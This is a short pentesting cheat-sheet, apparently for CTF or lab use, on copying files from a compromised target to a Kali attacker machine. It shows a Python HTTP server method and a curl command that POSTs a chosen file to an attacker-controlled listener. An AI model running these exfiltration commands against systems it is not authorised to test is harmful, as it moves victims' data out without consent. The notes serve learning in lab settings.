# Download
Very often we want to download and open locally a file we found in the target machine.

## Python
The simplest way to do it is to start a Python Server in the same directory of the file and send a GET request

```console
# From target
python3 -m http.server {PORT}

# From kali browser
http://{TARGET_IP}:{PORT}/{FILE_NAME}
```

## Curl
It can happen the target System has not python installed. In this case we can start a Python server locally and send a POST request (simulating an upload).

```console
# From kali
python downloader.py

# From target 
curl {KALI_IP}:9002 -X POST -F 'file=@"{/path/file}"'
```